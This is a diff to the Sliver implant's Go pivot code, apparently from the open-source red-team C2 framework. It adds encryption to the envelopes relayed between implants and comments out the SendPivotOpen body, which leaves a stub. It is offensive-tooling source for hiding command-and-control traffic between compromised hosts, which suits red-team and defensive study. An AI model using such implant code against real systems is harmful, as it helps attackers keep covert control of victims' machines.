@@ -27,6 +27,7 @@ import (
 	"net"
 	"sync"
 
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
@@ -109,32 +110,32 @@ func ReconnectActivePivots(connection *transports.Connection) {
 
 // SendPivotOpen - Sends a PivotOpen message back to the server
 func SendPivotOpen(pivotID uint32, registerMsg []byte, connection *transports.Connection) {
-	pivotsMap.Pivot(pivotID).Register = registerMsg
-	pivot := pivotsMap.Pivot(pivotID)
-	pivotOpen := &sliverpb.PivotOpen{
-		PivotID:       pivotID,
-		PivotType:     pivot.PivotType,
-		RemoteAddress: pivot.RemoteAddress,
-		RegisterMsg:   registerMsg,
-	}
-	data, err := proto.Marshal(pivotOpen)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Println(err)
-		// {{end}}
-		return
-	}
-	// W T F!!!!!
-	if connection.IsOpen {
-		connection.Send <- &sliverpb.Envelope{
-			Type: sliverpb.MsgPivotOpen,
-			Data: data,
-		}
-	} else {
-		// {{if .Config.Debug}}
-		log.Println("Connection is not open...")
-		// {{end}}
-	}
+	// pivotsMap.Pivot(pivotID).Register = registerMsg
+	// pivot := pivotsMap.Pivot(pivotID)
+	// pivotOpen := &sliverpb.PivotOpen{
+	// 	PivotID:       pivotID,
+	// 	PivotType:     pivot.PivotType,
+	// 	RemoteAddress: pivot.RemoteAddress,
+	// 	RegisterMsg:   registerMsg,
+	// }
+	// data, err := proto.Marshal(pivotOpen)
+	// if err != nil {
+	// 	// {{if .Config.Debug}}
+	// 	log.Println(err)
+	// 	// {{end}}
+	// 	return
+	// }
+	// // W T F!!!!!
+	// if connection.IsOpen {
+	// 	connection.Send <- &sliverpb.Envelope{
+	// 		Type: sliverpb.MsgPivotOpen,
+	// 		Data: data,
+	// 	}
+	// } else {
+	// 	// {{if .Config.Debug}}
+	// 	log.Println("Connection is not open...")
+	// 	// {{end}}
+	// }
 }
 
 // SendPivotClose - Sends a PivotClose message back to the server
@@ -156,13 +157,17 @@ func SendPivotClose(pivotID uint32, err error, connection *transports.Connection
 	}
 }
 
-// PivotWriteEnvelope - Writes a protobuf envolope to a generic connection
-func PivotWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
+// PivotWriteEnvelope - Writes a protobuf envelope to a generic connection
+func PivotWriteEnvelope(cipherCtx *cryptography.CipherContext, conn *net.Conn, envelope *sliverpb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Print("Envelope marshaling error: ", err)
 		// {{end}}
+		return err
+	}
+	data, err = cipherCtx.Encrypt(data)
+	if err != nil {
 		return err
 	}
 	dataLengthBuf := new(bytes.Buffer)
@@ -195,10 +200,10 @@ func PivotWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	return nil
 }
 
-// PivotReadEnvelope - Reads a protobuf envolope from a generic connection
-func PivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
+// PivotReadEnvelope - Reads a protobuf envelope from a generic connection
+func PivotReadEnvelope(cipherCtx *cryptography.CipherContext, conn net.Conn) (*sliverpb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4)
-	_, err := (*conn).Read(dataLengthBuf)
+	_, err := conn.Read(dataLengthBuf)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("pivots.PivotReadEnvelope error (read msg-length): %v\n", err)
@@ -210,7 +215,7 @@ func PivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 	dataBuf := make([]byte, 0)
 	totalRead := 0
 	for {
-		n, err := (*conn).Read(readBuf)
+		n, err := conn.Read(readBuf)
 		dataBuf = append(dataBuf, readBuf[:n]...)
 		totalRead += n
 		if totalRead == dataLength {
@@ -223,11 +228,15 @@ func PivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 			break
 		}
 	}
+	dataBuf, err = cipherCtx.Decrypt(dataBuf)
+	if err != nil {
+		return nil, err
+	}
 	envelope := &sliverpb.Envelope{}
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Unmarshaling envelope error: %v", err)
+		log.Printf("Unmarshal envelope error: %v", err)
 		// {{end}}
 		return &sliverpb.Envelope{}, err
 	}
